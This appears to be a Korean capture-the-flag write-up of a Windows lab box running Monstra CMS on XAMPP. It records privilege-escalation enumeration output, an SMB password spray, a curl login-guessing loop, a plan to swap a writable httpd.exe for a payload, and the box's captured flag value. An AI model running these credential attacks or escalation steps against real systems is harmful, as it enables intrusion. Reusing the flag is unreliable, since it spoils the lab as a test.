**`NT AUTHORITY\INTERACTIVE` 와 `CONSOLE LOGON` 이 붙어 있다.** 서비스 토큰에는 이게 안 붙는다. 즉 Apache 는 서비스로 등록된 게 아니라 **mike 의 로그온 세션에서 돌아가는 대화형 프로세스**다(XAMPP Control Panel 을 로그온 시 띄우는 전형적 구성). 그러면 **자동 로그온이 켜져 있을 가능성**이 높고, 그건 레지스트리에 평문 비밀번호가 있다는 뜻이다.

**`BUILTIN\Remote Desktop Users` 에 이미 들어 있다.** mike 의 평문 비밀번호를 얻으면 3389 로 갈아탈 수 있다.

### 4-1. 1순위 — AutoLogon 은 켜져 있는데 비밀번호가 없다

INTERACTIVE 관측 때문에 여기부터 갔다. 자동 로그온이 켜져 있으면 `DefaultPassword` 에 평문이 들어 있는 구성이 흔하다.

```
PS C:\xampp\htdocs\blog\public\themes\default> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr /i "AutoAdminLogon DefaultUserName DefaultPassword DefaultDomainName Aut
oLogonSID AltDefaultPassword"
    AutoLogonSID    REG_SZ    S-1-5-21-2619112490-2635448554-1147358759-1002
    AutoAdminLogon    REG_SZ    1
    DefaultUserName    REG_SZ    Mike
    DefaultDomainName    REG_SZ    DESKTOP-8OB2COP
PS C:\xampp\htdocs\blog\public\themes\default>
```

관측이 셋이다.

**`AutoAdminLogon` 은 1인데 `DefaultPassword` 도 `AltDefaultPassword` 도 없다.** 자동 로그온 비밀번호를 GUI(`netplwiz`)나 Sysinternals `Autologon` 으로 설정하면 평문이 레지스트리에 남지 않고 **LSA Secret** 에 `DefaultPassword` 라는 이름으로 암호화되어 들어간다. 그걸 읽으려면 SYSTEM 이 필요하고, SYSTEM 이 되려고 이걸 보고 있었으니 순환이다. **레지스트리에 평문이 없다는 것 자체가 답이다 — 이 경로는 여기서 끝난다.**

**`AutoLogonSID` 가 `...-1002` 다.** §4 첫머리 `whoami /all` 의 mike SID 와 같다. 즉 자동 로그온 대상이 **mike 본인**이지 Administrator 가 아니다. 설령 비밀번호를 캐냈어도 얻는 건 이미 가진 권한이다.

**`DefaultDomainName` 이 `DESKTOP-8OB2COP` 인데 호스트명은 `MIKE-PC` 다.** **[가정]** 자동 로그온을 설정한 뒤 컴퓨터 이름을 바꿨다는 해석이 자연스럽다. 확인한 것은 두 문자열이 다르다는 것뿐이라 §4-3 에 미해결 단서로 남긴다.

### 4-2. 나머지 후보 — 전부 때려봤고 전부 빈손

**출처 열을 붙인 이유가 있다.** 이 열거는 살아 있는 리버스셸 페인에서 돌았고, 스크롤백은 **21:00 KST 에 한 번 저장된 뒤 끊긴다**(`try_privesc_full_scrollback.log`). 그 뒤에 던진 명령의 출력은 페인에만 남았고 페인은 손절 때 종료됐다. **파일로 되짚을 수 있는 줄과 없는 줄을 섞어 놓으면 다음 사람이 이 표를 믿을 수 없다.** 「페인만」으로 표시된 4줄은 재확인이 안 된 것으로 읽어라.

| # | 확인한 것 | 실측 결과 | 판정 | 출처 |
|---|---|---|---|---|
| 1 | `AlwaysInstallElevated` (HKLM·HKCU 둘 다) | 두 키 모두 **존재하지 않음** | 성립 안 함 | `try4_alwaysinstallelevated_xampppw.log` |
| 2 | `C:\xampp\passwords.txt` | XAMPP **기본 배포 파일 그대로**(`ppmax2011` 등 스톡 값) | 커스텀 값 없음 | `try4_...log` |
| 3 | 서비스 목록 중 `C:\WINDOWS` 밖 경로 | `edgeupdate`·`edgeupdatem`·`MicrosoftEdgeElevationService`·`uhssvc`·`VGAuthService`·`VMTools` 뿐. **전부 따옴표로 감싸진 경로**, `vmtoolsd.exe` 는 `Everyone:(I)(RX)` — 쓰기 불가 | 비따옴표 경로 없음, 쓰기 가능 바이너리 없음 | `try3_services_tasks.log` |
| 4 | 스케줄 작업 중 `\Microsoft*` 아닌 것 | `OneDrive Reporting Task-S-1-5-21-...-1002` 하나 (mike 소유) | 상위 권한 작업 없음 | `try3_...log` |
| 5 | `my.ini`·`config.inc.php`·`php.ini` 의 `password` | 전부 **주석·기본값**. phpMyAdmin 은 `['password'] = ''` + `AllowNoPassword = true` | 재사용할 비밀번호 없음 | **페인만** |
| 6 | `netstat -ano` 리스너 | 80·443(Apache, PID 5268)·135·139·445·3389·5040 + 동적 RPC. **로컬 전용 서비스 없음**, 3306 도 없음 | 로컬 공격면 없음 | `try_privesc_full_scrollback.log:903` |
| 7 | PowerShell 히스토리 | `ConsoleHost_history.txt` 내용이 `Restart-Computer` 한 줄 | 크리덴셜 없음 | `try_privesc...log:779` |
| 8 | `C:\output.txt` (플래그와 같은 타임스탬프) | PG 프로비저닝의 **PowerShell 트랜스크립트**(`Start time: 20260820040511`). `slmgr` 활성화 출력뿐 | 미끼 아님, 무관 | `try3_...log:188` |
| 9 | `net localgroup administrators` | 멤버가 **`Administrator` 하나**. mike 없음 | UAC 우회 경로 없음 | `try3_...log:260` |
| 10 | `cmdkey /list` | `* NONE *` | 저장된 크리덴셜 없음 | `try3_...log` |
| 11 | `unattend.xml`·`sysprep.*`·`*.kdbx`·`*.rdp`·`*.vnc` 전체 디스크 검색 | **0건**. `web.config` 는 .NET 스톡뿐 | 자격증명 파일 없음 | **페인만** (명령은 `try3_...log:448` 에 보이나 출력 전에 로그가 끊긴다) |
| 12 | 자동 시작 항목 | HKLM Run = `SecurityHealth`·`VMware User Process`. HKCU Run = Edge 자동실행. mike Startup = `xampp-control - Shortcut.lnk` | 심을 자리 없음 | `try6_autostart.log` |
| 13 | `$env:PATH` 각 디렉터리 쓰기 테스트 | 쓰기 가능한 곳이 `C:\Users\Mike\AppData\Local\Microsoft\WindowsApps` **하나뿐**(mike 본인 디렉터리) | 상위 권한 프로세스가 안 지나감 | **페인만** |
| 14 | 핫픽스 | 최신이 `KB5012599`·`KB5012117`·`KB5011651` (전부 **2022-04-18**) | 커널 익스는 2022-04 이후 것만 후보 | **페인만** |
| 15 | MySQL / `INTO OUTFILE` / UDF | 서비스도 프로세스도 소켓(3306)도 **없다**. 게다가 Monstra 는 DB 를 안 쓴다 | 원리적으로 부재 → §4-2-b | 표 6번 + **페인만** |
| 16 | SAM 하이브 ACL (SeriousSAM, CVE-2021-36934) · 크리덴셜 재사용 | `icacls` 가 **ACL 조차 못 읽고** `vssadmin` 도 거부 / `wazowski` 변형 5개 전부 `STATUS_LOGON_FAILURE` | → §4-2-c | `try5_sam_acl_shadow.log` · `try2_spray_admin.log` |

> [!danger] `C:\xampp` 바이너리 쓰기 권한은 **이 표에 없다 — 배제된 게 아니라 미완이다**
> 한때 이 표에 "트리거 없음"으로 올려놨었는데 **틀린 분류였다.** `httpd.exe`·`mysqld.exe` 둘 다 mike 가 **실제로 덮어쓸 수 있다**(`Authenticated Users:(M)`). 못 채운 것은 「무엇이 이걸 SYSTEM 으로 재실행하는가」 한 조각이고, 그 조각을 찾는 도중에 박스가 내려갔다. **§4-4 로 옮겼다** — 다시 붙는 사람은 거기부터다.

`xampp-control - Shortcut.lnk` 는 §4 첫머리의 INTERACTIVE/CONSOLE LOGON 관측을 **확정**해 준다. Apache 는 서비스가 아니라 mike 의 자동 로그온 세션에서 XAMPP Control Panel 이 띄우는 프로세스다. 그래서 서비스 목록에 Apache 가 아예 없다. 이건 왜 `SeImpersonatePrivilege` 가 없는지의 답이기도 하다 — 서비스 계정을 거치지 않았으니 애초에 받은 적이 없다.

#### 4-2-b. MySQL 경로는 존재하지 않는다 — 조합만 보고 앞서간 추론이었다

이 박스에서 제일 오래 붙들었던 오답이 **「XAMPP 니까 MySQL 이 있고, `INTO OUTFILE` 이나 UDF 로 파일을 쓸 수 있다」** 는 가정이다. `Apache 2.4.41 + PHP 7.3.10 + Win64` 배너를 보고 XAMPP 를 맞게 특정했는데, 거기서 **번들 구성요소가 전부 돌고 있을 것**이라는 반 걸음을 공짜로 얹었다. 세 층에서 무너진다.

**① 서비스로 등록돼 있지 않다.** XAMPP 기본 설치는 MySQL 과 Apache 를 SYSTEM 서비스로 등록할 수 있고, 그러면 웹 RCE 에서 서비스 바이너리를 건드려 SYSTEM 으로 올라간다. 여기는 **XAMPP 서비스가 하나도 없다.**

```
PS C:\...> Get-CimInstance Win32_Service | ? { $_.PathName -like '*xampp*' } | select Name,StartName,State,PathName | fl
(빈 결과 — 한 행도 없음)
PS C:\...> sc.exe qc mysql
[SC] OpenService FAILED 1060:

The specified service does not exist as an installed service.
```

**② 프로세스로도 안 돈다.**

```
PS C:\...> netstat -ano | findstr 3306
(없음)
PS C:\...> cmd /c "tasklist | findstr /i mysql"
(없음)
```

`mysql.exe -u root -e "..."` 도 아무것도 못 뱉는다 — 서버가 죽어 있어 연결 자체가 안 된다. 바이너리는 디스크에 있다(`mysql.exe`·`mysqld.exe`, 2019-09-08). **깔려 있는 것과 도는 것은 다르다.** 설령 내가 mike 로 `mysqld` 를 띄워도 그 프로세스는 mike 로 돌아 얻는 게 없다.

이 ①②의 출력은 **손절 직전 살아 있던 `mon_lsnr443` 페인에서 나왔고**, 스크롤백 저장(21:00 KST) 이후라 파일로 보존되지 않았다. 다만 3306 부재는 파일로 되짚힌다 — §4-2 표 6번의 `netstat -ano | findstr LISTENING` 전문(`try_privesc_full_scrollback.log:903`)에 3306 이 없다.

**③ 애초에 쓸 DB 가 없다.** 이게 진짜 답이다. **Monstra 3.0.4 는 플랫파일 CMS 다.** 클론한 소스(`~/PG/Monster/monstra-src`)로 확인했다.

- 데이터가 전부 XML 파일이다 — `storage/database/users.table.xml`·`pages.table.xml`·`options.table.xml`·`plugins.table.xml`·`menu.table.xml`
- `engine/boot/defines.php` 의 DB 설정 세 줄이 **주석 상태로 출하된다**: `//define('MONSTRA_DB_DSN', 'mysql:dbname=monstra;host=localhost;port=3306');`
- ORM 초기화가 그 상수에 걸려 있다 — `engine/Monstra.php` 는 `if (defined('MONSTRA_DB_DSN'))` 안에서만 Idiorm 을 붙인다. 주석이면 그 블록에 **들어가지도 않는다**
- README 의 System Requirements 가 요구하는 것은 PHP + SimpleXML + mbstring 뿐. **데이터베이스 항목이 없다**

그래서 `INTO OUTFILE`·UDF·`mysql` 크리덴셜 재사용은 **막힌 경로가 아니라 원리적으로 존재한 적이 없는 경로**다. §3 에서 `users.table.xml` 을 직접 읽으려 했던 것(§6-5)이 방향으로는 맞았다 — 이 CMS 의 「DB」는 그 파일이다.

> [!tip] 일반화 — 스택 조합에서 구성요소를 유추하지 마라
> 「XAMPP 배너 = MySQL 있음」, 「LAMP = MySQL 있음」은 **배포판이 무엇을 번들하는지**의 이야기지 **무엇이 돌고 있는지**가 아니다. 확인은 세 줄이면 끝난다 — 서비스(`sc.exe qc <이름>`), 프로세스(`tasklist | findstr`), 소켓(`netstat -ano | findstr <포트>`). 셋 다 빈손이면 그 경로는 배제다.
> 그리고 그 위에 한 층 더 있다 — **앱이 그 DB 를 쓰기는 하는가.** 플랫파일 CMS(Monstra·Grav·Kirby·Flextype)를 만나면 DB 축은 통째로 없다.

#### 4-2-c. SeriousSAM 도, 크리덴셜 재사용도 아니다

`SeImpersonate` 가 없어 Potato 계열이 빠지면 다음으로 볼 것은 SAM 하이브 접근이다(CVE-2021-36934). 빈손이었다.

```
PS C:\xampp\htdocs\blog\public\themes\default> echo ===SAM_ACL===; icacls C:\Windows\System32\config\SAM; echo ===SHADOW===; vssadmin list shadows; echo ===PF_ACL===; icacls "C:\Program Files\VMware\V
Mware Tools\vmtoolsd.exe"; echo ===XAMPP_ACL===; icacls C:\xampp; echo ===DONE===
===SAM_ACL===
Successfully processed 0 files; Failed processing 1 files
===SHADOW===
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Error: You don't have the correct permissions to run this command.  Please run this utility from a command
window that has elevated administrator privileges.

===PF_ACL===
C:\Program Files\VMware\VMware Tools\vmtoolsd.exe BUILTIN\Administrators:(I)(F)
                                                  Everyone:(I)(RX)
                                                  NT AUTHORITY\SYSTEM:(I)(F)

Successfully processed 1 files; Failed processing 0 files
===XAMPP_ACL===
C:\xampp BUILTIN\Administrators:(I)(OI)(CI)(F)
         NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
         BUILTIN\Users:(I)(OI)(CI)(RX)
         NT AUTHORITY\Authenticated Users:(I)(M)
         NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)

Successfully processed 1 files; Failed processing 0 files
===DONE===
PS C:\xampp\htdocs\blog\public\themes\default>
```

`icacls` 가 SAM 에서 **`Failed processing 1 files`** 를 낸다 = ACL 조차 못 읽는다. SeriousSAM 은 `BUILTIN\Users` 에 `(RX)` 가 붙어 있어야 성립하는데 읽기 자체가 막혔다. `vssadmin` 도 거부라 섀도카피 경로로 우회할 수도 없다. 같은 출력에 들어 있는 `C:\xampp` 의 `Authenticated Users:(M)` 가 왜 쓸모없는지는 §4-2-c 에 적었다.

크리덴셜 재사용도 확인했다. Monstra 의 `wazowski` 와 그 변형을 Administrator 로 SMB 에 던졌다.

```
nxc smb 192.168.248.180 -u Administrator -p pw_spray.txt
```

```
SMB                      192.168.248.180 445    MIKE-PC          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MIKE-PC) (domain:Mike-PC) (signing:False) (SMBv1:False)
SMB                      192.168.248.180 445    MIKE-PC          [-] Mike-PC\Administrator:wazowski STATUS_LOGON_FAILURE
SMB                      192.168.248.180 445    MIKE-PC          [-] Mike-PC\Administrator:Wazowski STATUS_LOGON_FAILURE
SMB                      192.168.248.180 445    MIKE-PC          [-] Mike-PC\Administrator:monster STATUS_LOGON_FAILURE
SMB                      192.168.248.180 445    MIKE-PC          [-] Mike-PC\Administrator:Monster STATUS_LOGON_FAILURE
SMB                      192.168.248.180 445    MIKE-PC          [-] Mike-PC\Administrator:mike STATUS_LOGON_FAILURE
```

> 출처: `~/PG/Monster/try2_spray_admin.log`. 5개로 끊은 것은 의도적이다 — 이건 크리덴셜 **재사용 확인**이지 브루트포스가 아니다. 로컬 계정 잠금 정책을 모르는 상태에서 대량으로 던지면 Administrator 를 잠가 박스를 못 쓰게 만든다.

### 4-3. 설명이 안 된 관측 둘

배제 목록을 다 태우고도 **다른 관측과 연결하지 못한 것이 둘** 남았다. 둘 다 그 자체로는 경로가 아니지만, §4-4 의 미완 리드에 빠진 조각이 여기 있을 가능성이 있다.

**(가) 소유자를 못 읽는 `notepad.exe` 23개.** 프로세스 소유자를 훑다가 걸렸다.

```
PS C:\xampp\htdocs\blog\public\themes\default> echo ===NETSTAT===; netstat -ano | findstr LISTENING; echo ===PROCOWN===; Get-WmiObject Win32_Process | select ProcessId,Name,@{n='Owner';e={$_.GetOwner(
).User}},ExecutablePath | ? { $_.Owner -ne 'mike' } | ft -auto -wrap; echo ===DONE===
...
===PROCOWN===

ProcessId Name                      Owner ExecutablePath
--------- ----                      ----- --------------
        0 System Idle Process
        4 System
...
     3660 notepad.exe
...
      788 notepad.exe
     2924 notepad.exe
      436 notepad.exe
     4316 notepad.exe
     7140 notepad.exe
```

> 출처: `~/PG/Monster/try_privesc_full_scrollback.log` 901~1005행. `notepad.exe` 행은 정확히 **23개**다(`grep -c`).

읽히는 것은 하나뿐이다 — `Owner` 열이 **비어 있다.** `GetOwner()` 가 값을 못 냈다는 뜻이고, mike 권한으로는 그 프로세스 토큰을 열 수 없다는 뜻이다(필터가 `$_.Owner -ne 'mike'` 였으니 mike 소유 프로세스는 애초에 걸러졌다). `ExecutablePath` 도 같은 이유로 비었다. **다른 계정이 메모장을 23개 띄워 두고 있다** — Fundamental 난이도 박스에서 이건 우연으로 보기 어렵다.

**[가정]** 이 프로세스들이 세션 0(서비스 전용 세션)에 있다는 판독은 손절 직전 살아 있던 페인에서 나온 것이고, **저장된 산출물에는 세션 번호 컬럼이 없다.** 위 블록으로 확정되는 것은 「소유자 접근 거부」까지다.

어느 쪽이든 mike 로는 손을 못 댄다. 상위 권한 프로세스에 붙으려면 `SeDebugPrivilege` 가 필요한데 §4 첫머리 특권 목록에 없다. **관측만 남기고 넘어간다.** 이걸 쓰려면 이미 다른 경로로 올라가 있어야 한다는 점에서, 적어도 *진입* 벡터는 아니다.

**(나) 머신 개명 흔적.** `DefaultDomainName` 이 `DESKTOP-8OB2COP` 인데 실제 호스트명은 `MIKE-PC` 다(§4-1). **[가정]** 자동 로그온을 설정한 뒤 컴퓨터 이름을 바꿨다는 해석이 자연스럽지만, 확인한 것은 두 문자열이 다르다는 것뿐이다. 옛 이름으로 남은 프로필 디렉터리·인증서·SPN·백업 경로가 있는지 **찾아보지 못했다.** 이 단서를 §4 의 어떤 관측과도 연결하지 못했다.

### 4-4. 미완 — 가장 유력한 리드 (다시 붙는다면 여기부터)

> [!danger] 이 절은 **배제 목록이 아니다**
> §4-2 의 16종은 "때려봤고 아니었다"이지만, **이 경로는 「아니었다」가 아니라 「끝까지 못 갔다」**다. 조각 하나가 비어 있고, 그 조각을 찾는 도중에 박스가 리버트됐다(§6-8). **다음 사람은 §4-2 를 다시 때리지 말고 여기서 시작하면 된다.**

**확인된 것 ① — 바이너리 두 개를 mike 가 덮어쓸 수 있다.**

```
PS C:\...> icacls C:\xampp\mysql\bin\mysqld.exe
C:\xampp\mysql\bin\mysqld.exe BUILTIN\Administrators:(I)(F)
                              NT AUTHORITY\SYSTEM:(I)(F)
                              BUILTIN\Users:(I)(RX)
                              NT AUTHORITY\Authenticated Users:(I)(M)
PS C:\...> icacls C:\xampp\apache\bin\httpd.exe
C:\xampp\apache\bin\httpd.exe BUILTIN\Administrators:(I)(F)
                              NT AUTHORITY\SYSTEM:(I)(F)
                              BUILTIN\Users:(I)(RX)
                              NT AUTHORITY\Authenticated Users:(I)(M)
```

`Authenticated Users:(I)(M)` = **Modify.** mike 는 Authenticated Users 이므로 `httpd.exe` 도 `mysqld.exe` 도 **실제로 바꿔치기할 수 있다.** XAMPP 를 `C:\` 루트에 통째로 까는 구성이면 상속 ACL 이 이렇게 된다. **이 박스의 의도된 취약점으로 보인다** — Fundamental 난이도에서 이만큼 눈에 띄는 오설정은 흔치 않다.

**확인된 것 ② — 그런데 지금 그걸 실행하는 주체는 mike 다.**

```
PS C:\...> Get-WmiObject Win32_Process -Filter "ProcessId=5268" | select ProcessId,Name,@{n='Owner';e={$_.GetOwner().User}} | fl
ProcessId : 5268
Name      : httpd.exe
Owner     : Mike
```

앞의 관측이 여기서 한 점으로 모인다 — `AutoAdminLogon=1` · `DefaultUserName=Mike` · `AutoLogonSID` 가 mike 본인(`-1002`) · `whoami /all` 의 `INTERACTIVE`+`CONSOLE LOGON` · Startup 폴더의 `xampp-control - Shortcut.lnk` · `Win32_Service` 에 XAMPP 항목 없음(§4-2-b). **XAMPP 는 서비스가 아니라 mike 의 자동 로그온 데스크톱 세션에서 컨트롤 패널이 띄운 프로세스다.** 그래서 `httpd.exe` 를 페이로드로 바꾸고 지금 재시작하면 **mike 로** 다시 뜰 뿐이다.

**남은 질문은 정확히 하나다.**

> **무엇이 `C:\xampp` 밑 바이너리를 SYSTEM(또는 Administrator) 컨텍스트로 재실행할 수 있는가?**

쓰기는 확보돼 있으니 이 한 조각만 채우면 경로가 닫힌다. 확인해야 할 후보를 적어둔다 — **아래는 전부 미확인이다.**

- **Session 0 의 `notepad.exe` 23개**(§4-3 가). **[가정]** 다른 계정이 뭔가를 주기적으로 띄우고 있다면 **그게 트리거일 수 있다.** 다만 확정된 것은 「`GetOwner()` 가 거부됐다 = mike 소유가 아니다」까지이고, 세션 번호도 기동 주체도 주기성도 확인하지 못했다. 이 연결 자체가 `[가정]` 이다
- Administrator 가 주기적으로 로그온해 XAMPP Control Panel 을 띄우는 구성인지 — 로그온 이벤트를 못 봤다
- 재부팅이 SYSTEM 컨텍스트에서 뭔가를 실행하는지 — 자동 로그온 대상이 mike 라 그대로면 mike 로 뜬다. `RunOnce`·`Winlogon\Userinit`·`Shell` 값은 확인하지 않았다
- XAMPP Control Panel(`xampp-control.exe`) 자체에 관리자 권한 상승(UAC) 요청 매니페스트가 있는지 — 확인하지 않았다

**절차상 주의.** `httpd.exe` 를 덮어쓰면 웹서비스가 죽고 그게 곧 **내 발판(`.chunk.php` RCE)이 사라지는 것**이다. 교체는 반드시 리버스셸을 별도로 확보한 뒤에, 원본을 백업하고, 실패 시 되돌릴 수 있는 상태에서 해야 한다. `mysqld.exe` 는 애초에 아무도 실행하지 않으므로(§4-2-b) 교체해도 아무 일이 안 일어난다 — **트리거를 먼저 찾고 대상을 고르는 순서다.**

> [!tip] 일반화 — ACL 을 찾았으면 다음 명령은 교체가 아니라 소유자 확인
> `icacls` 에서 `(M)`·`(F)` 를 봤을 때 물어야 할 것은 "바꿀 수 있나"가 아니라 **"바꾸면 누가 실행하나"**다. 순서는 `icacls` → `Get-CimInstance Win32_Service | select Name,StartName,PathName`(서비스인가, 어느 계정인가) → `Get-WmiObject Win32_Process ... GetOwner()`(지금 누가 돌리고 있나). 서비스가 아니고 지금 도는 것도 나라면, 그 ACL 은 아직 승리 조건이 아니라 **절반짜리 리드**다. 버리지도 말고 다 이겼다고 생각하지도 마라 — **트리거를 찾는 것이 남은 일의 전부**가 된다.

> [!warning] 낮은 권한에서의 「없음」은 결론이 아니다
> `whoami /all` 한 번으로 "특권 없음"을 확정하지 마라. Administrator 를 잡으면 **같은 열거를 다시 돌려야 한다** — 낮은 권한에서 안 보이던 서비스·작업·파일이 올라가면 보인다. Linux 쪽에서 `find / -perm -4000` 이 `/home/*` 의 `drwxr-x---` 때문에 커스텀 SUID 를 통째로 놓친 것과 같은 함정이다.

## 5. 플래그

`local.txt` 만 확보했다. **2026-08-20 인스턴스의 값**이다 — PG 는 박스를 다시 켤 때마다 플래그를 새로 만든다.

| 플래그 | 경로 | 값 |
|---|---|---|
| local | `C:\Users\mike\Desktop\local.txt` | `db85d2fa7033db43da92bb07dde4da5b` |
| proof | `C:\Users\Administrator\Desktop\proof.txt` (추정) | **미확보** |

proof 의 경로를 「추정」으로 남기는 이유는, mike 권한으로 `dir C:\Users\Administrator\Desktop` 을 때리면 `Directory of C:\Users\Administrator` 헤더만 나오고 목록이 비어서다 — 접근 거부지 "파일 없음"이 아니다. `C:\Users` 에 `Administrator`·`Mike`·`Public` 세 디렉터리가 있다는 것까지는 확인했다. **§4 말미의 경고가 여기 그대로 적용된다: 낮은 권한에서 안 보이는 것은 「없다」가 아니다.**

시험 증거 형식대로 한 화면에 담았다.

```
PS C:\xampp\htdocs\blog\public\themes\default> cmd /c "whoami & hostname & ipcon
fig | findstr IPv4 & date /t & time /t & type C:\Users\mike\Desktop\local.txt"
mike-pc\mike
Mike-PC
   IPv4 Address. . . . . . . . . . . : 192.168.248.180
Thu 08/20/2026
04:40 AM
db85d2fa7033db43da92bb07dde4da5b
PS C:\xampp\htdocs\blog\public\themes\default>
```

> 출처: `~/PG/Monster/proof_user.txt`. **이 파일의 내력을 밝혀둔다** — 원래 러너가 플래그 확보 직후 저장하려던 증거 파일인데 저장 전에 하네스 차단을 받았다. 지금 남아 있는 것은 그 뒤에 `tmux capture-pane -pt mon_lsnr443 -S -3000` 으로 페인 스크롤백에서 **사후 회수한 66행**이다. 실행 시점에 기록된 파일이 아니라 **스크롤백 덤프**이고, 그래서 mtime(20:50 KST)은 명령 실행 시각이 아니다. 내용 자체는 페인 원문 그대로다.

PowerShell 안에서 `cmd /c "... & ... & ..."` 로 감싼 이유는, PowerShell 에서는 `&` 가 호출 연산자라 명령 구분자로 쓸 수 없기 때문이다(`;` 를 쓰거나 이렇게 cmd 에 넘긴다). 타겟 시각 `04:40 AM` 은 UTC-7 이다 — 같은 순간의 Kali 시각은 20:40 KST 였다.

## 6. 막혔던 지점 / 시행착오

### 1. 정답을 손으로 이미 때렸는데 밴 화면을 받고 있었다 — 25분

20:11 KST 에 수동으로 7개 조합을 돌렸다.

```
for p in admin password monstra admin123 Password123 mike wazowski; do
  out=$(curl -s -m 20 -c ck.txt -b ck.txt -d "login=admin&password=$p&login_submit=Log+In" \
        'http://192.168.248.180/blog/admin/' -o /dev/null -w '%{http_code} %{redirect_url} %{size_download}')
  echo "admin:$p -> $out"
done
```

```
admin:admin -> 200  8507
admin:password -> 200  8507
admin:monstra -> 200  8507
admin:admin123 -> 200  8507
admin:Password123 -> 200  8507
admin:mike -> 200  8513
admin:wazowski -> 200  8513
```

**`-c ck.txt -b ck.txt` 로 쿠키 단지를 7번 공유한 것**이 문제였다. 실패할 때마다 `login_attempts` 가 1씩 올라가서 6번째부터 5에 도달했고, 그때부터 서버는 비밀번호를 아예 검사하지 않고 "You are banned for 10 minutes" 를 돌려줬다. 7번째가 정답 `wazowski` 였다.

**증거는 화면에 있었다.** 앞의 다섯은 8507, 뒤의 둘만 8513. 6바이트 차이. 그걸 보고도 "플래시 메시지가 쌓였겠지"로 넘겼다. 더 나쁘게는, 곧바로 쿠키 없이 두 응답을 다시 받아 `diff` 를 떠서 **차이 없음**을 확인하고 오판을 확정지었다 — 쿠키가 없으니 밴이 안 걸린 게 당연했다.

교훈 두 개.
- **로그인 시도를 반복할 때 쿠키 단지를 공유하지 마라.** 시도마다 `-c` 를 새 파일로 하거나 아예 쿠키 옵션을 빼라.
- **응답 크기 차이는 반드시 본문을 열어봐라.** "왜 다른지"를 설명하지 못하면 넘어가면 안 된다. 재현 조건(쿠키 유무)을 바꿔서 뜬 diff 는 원래 관측을 반증하지 못한다.

이 사고 덕에 hydra 가 왜 통했는지도 설명된다. **잠금이 클라이언트 쿠키에 있어서 쿠키를 안 보내는 hydra 는 잠금을 못 받는다.** 소스를 읽고서야 알았다.

### 2. 캡차 우회에 시간을 썼는데 애초에 갈 수 없는 길이었다 — 15분

`/blog/users/registration` 이 열려 있길래 가입 → 권한상승을 노렸다. cryptographp 캡차가 막고 있어서 이미지를 받아봤다.

```
$ curl -sL -b reg.jar -c reg.jar 'http://monster.pg/blog/plugins/captcha/crypt/cryptographp.php?cfg=0&' -o cap.png
$ file cap.png
cap.png: PNG image data, 130 x 40, 8-bit/color RGB, non-interlaced
$ python3 -c "from PIL import Image; from collections import Counter; print(Counter(Image.open('cap.png').convert('RGB').getdata()).most_common(8))"
[((255, 255, 255), 4781), ((191, 191, 191), 336), ((128, 2, 0), 43), ((9, 96, 8), 31), ((202, 48, 54), 1), ((28, 82, 53), 1), ((134, 133, 129), 1), ((162, 239, 5), 1)]
```

흰 배경 + 회색 점 + 빨간 선 + 초록 호. **글자 픽셀이 없다.** `cryptographp.inc.php` 는 `imagettftext()` 로 TTF 를 그리는데 폰트 로드가 실패하면 아무것도 안 그려지고 잡음만 남는다. 읽을 방법이 없다.

`answer=` 를 비워 우회를 시도했지만 실패했다. `cryptographp.fct.php` 를 보면 이유가 명확하다.

```php
if ($_SESSION['cryptcode'] and ($_SESSION['cryptcode'] == $code)) {
```

세션값이 없으면 첫 조건에서 그냥 false 다.

**문제는 이 15분이 통째로 무의미했다는 것이다.** `users.plugin.php` 의 가입 처리는 role 을 하드코딩한다.

```php
Users::$users->insert(array('login'    => Security::safeName($user_login),
                     'password'        => Security::encryptPassword(Request::post('password')),
                     ...
                     'role'            => 'user'));
```

그리고 프로필 수정(`getProfileEdit`)이 업데이트하는 필드는 `login/firstname/lastname/email/skype/about_me/twitter` 뿐 — **role 은 매스 어사인먼트가 안 된다.** filesmanager·themes 같은 관리 플러그인은 `in_array(Session::get('user_role'), array('admin','editor'))` 로 걸린다.

**"들어갈 수 있나"보다 "들어가면 뭘 할 수 있나"를 먼저 봤어야 했다.** 소스가 손에 있었는데 이미지 픽셀부터 셌다.

### 3. `.php7` 업로드가 안 먹혔다

§3 에 적은 그대로다. 블랙리스트에 `php7` 이 없는 것은 **소스로 확인했고 사실이다.** 그런데 업로드 자체가 죽어 있어서 EDB-48479·EDB-49949 가 둘 다 무용지물이었다.

`.txt`·`.jpg` 로 테스트해서 **"확장자 필터가 아니라 업로드 기능"** 이라고 계층을 분리한 것이 방향 전환에 결정적이었다. 이걸 안 했으면 `.pht`·`.phar`·이중확장자·널바이트로 한참 더 헤맸을 것이다.

일반화: **CMS 관리자 패널을 잡으면 업로드만 보지 마라.** 테마/템플릿/스니펫 에디터, 플러그인 설치, 백업 복원 — PHP 를 디스크에 쓰는 경로는 보통 여러 개다.

### 4. 도구 쪽에서 태운 시간

- **`hashcat --stdout -r best64.rule` 이 사전을 0줄로 만들었다.** Kali 의 hashcat 7.1.2 에는 그 룰 파일이 없다(`best66.rule` 이 있다). 왜 알아채지 못하는지가 진짜 함정이라 **§6-7 에 따로 적었다.**
- **hydra tmux 세션을 `users.txt` 없이 먼저 띄웠다.** 세션이 즉시 죽고 원인이 안 보였다. tmux 안에서 도는 명령은 실패해도 조용하다 — 파일 의존성은 세션을 만들기 전에 만든다.
- **`<pre>` 가 든 PHP 페이로드를 heredoc 으로 원격에 쓰려다 인용이 두 번 깨졌다.** `pre: No such file or directory` — 원격 bash 가 `<`를 리다이렉션으로 읽었다. base64 로 감싸 전달하고 `--data-urlencode 'content@파일'` 로 넘기는 것으로 해결했다. **SSH 를 한 번 더 거치는 환경에서 특수문자가 든 페이로드는 인용으로 싸우지 말고 인코딩으로 도망가라.**
- 예열 스캔을 `--top-ports 200` 으로 돌렸지만 **`-p-` 결과가 나올 때까지 판단을 유보**했다. 결과적으로 추가된 포트는 전부 Windows 기본 구성이라 소득이 없었지만, 순서 자체는 지켜야 한다.

### 5. 안 통한 것들 (전부 확인 후 폐기)

| 시도 | 결과 |
|---|---|
| SMB null / guest 세션 | `NT_STATUS_ACCESS_DENIED` / `NT_STATUS_ACCOUNT_DISABLED`. `rpcclient -U '' -N` 도 `Cannot connect`, `enum4linux-ng` 도 세션 실패 |
